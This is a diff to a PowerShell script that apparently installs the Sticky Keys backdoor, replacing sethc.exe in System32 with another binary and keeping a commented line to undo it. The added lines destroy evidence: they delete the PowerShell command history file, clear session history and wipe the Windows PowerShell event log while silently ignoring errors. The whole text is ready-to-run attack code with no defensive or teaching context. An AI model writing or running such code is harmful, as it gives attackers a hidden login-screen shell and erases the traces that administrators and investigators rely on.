@@ -24,3 +24,20 @@ Copy-Item -Path $cmd -Destination $orig -Force
 
 #how to reverse
 #Copy-Item -Path "C:\Windows\System32\sethc_backup.exe" -Destination "C:\Windows\System32\sethc.exe" -Force
+
+
+try {
+    # Clear PSReadLine file history
+    $histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    if (Test-Path $histFile) {
+        Remove-Item $histFile -Force -ErrorAction SilentlyContinue
+    }
+
+    # Clear in-memory session history
+    Clear-History -ErrorAction SilentlyContinue
+
+    # Clear PowerShell event log
+    wevtutil cl "Windows PowerShell" 2>$null
+} catch {
+    # Ignore any errors during cleanup
+}
